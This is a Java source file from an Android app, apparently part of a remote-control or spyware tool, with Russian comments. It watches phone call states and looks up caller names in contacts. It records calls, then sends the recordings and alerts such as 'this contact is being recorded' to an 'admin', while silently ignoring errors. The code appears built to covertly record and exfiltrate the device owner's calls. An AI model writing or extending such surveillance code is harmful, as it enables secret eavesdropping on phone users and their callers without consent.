package com.pulse.control;

import android.content.Context;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

/**
 * Следит за состоянием звонка: подняли трубку → начали запись (если нужно),
 * положили → сохранили и отправили.
 */
public final class PhoneWatcher {

    private static PhoneStateListener listener;
    private static boolean inCall = false;
    private static String lastNumber = null;

    private PhoneWatcher() {}

    public static void start(final Context c) {
        if (listener != null) return;
        try {
            TelephonyManager tm = (TelephonyManager) c.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm == null) return;

            listener = new PhoneStateListener() {
                @Override public void onCallStateChanged(int state, String number) {
                    try { onState(c, state, number); } catch (Throwable ignored) {}
                }
            };
            try {
                tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
            } catch (Throwable t) {
                // На Android 12+ без READ_PHONE_STATE номер не придёт, но состояние — да
                tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
            }
            LogStore.add("📞 Слежу за звонками (" + CallRec.modeName(c) + ")");
        } catch (Throwable ignored) {}
    }

    public static void stop() {
        listener = null;
    }

    private static void onState(Context c, int state, String number) {
        if (number != null && !number.isEmpty()) lastNumber = number;

        if (state == TelephonyManager.CALL_STATE_RINGING) {
            // звонок идёт — запоминаем кто
            if (CallRec.mode(c) == CallRec.CONTACTS && CallRec.shouldRecord(c, number)) {
                Act.sendToAdmin("📞 <b>Звонок от " + Tools.e(nameOf(c, number)) + "</b>\n"
                        + "<i>этот контакт записывается</i>", null);
            }
            return;
        }

        if (state == TelephonyManager.CALL_STATE_OFFHOOK) {
            // подняли трубку — начинаем запись
            if (inCall) return;
            inCall = true;
            String who = number != null ? number : lastNumber;
            if (CallRec.mode(c) != CallRec.OFF && CallRec.shouldRecord(c, who)) {
                String err = CallRec.start(c, nameOf(c, who));
                if (err == null) {
                    LogStore.add("📞 Записываю звонок с " + nameOf(c, who));
                } else {
                    Act.sendToAdmin("📞 <b>Не удалось начать запись</b>\n" + Tools.e(err), null);
                }
            }
            return;
        }

        if (state == TelephonyManager.CALL_STATE_IDLE) {
            if (!inCall) return;
            inCall = false;
            if (CallRec.isRecording()) {
                CallRec.stopAndSend(c);
            }
        }
    }

    private static String nameOf(Context c, String number) {
        if (number == null || number.isEmpty()) return "неизвестный";
        try {
            android.net.Uri u = android.net.Uri.withAppendedPath(
                    android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                    android.net.Uri.encode(number));
            android.database.Cursor cur = c.getContentResolver().query(u,
                    new String[]{android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
            if (cur != null) {
                try {
                    if (cur.moveToFirst()) return cur.getString(0) + " (" + number + ")";
                } finally { cur.close(); }
            }
        } catch (Exception ignored) {}
        return number;
    }

    public static boolean inCall() { return inCall; }

    /** Входящий номер последнего звонка (для ручной записи). */
    public static String lastNumber() { return lastNumber; }
}
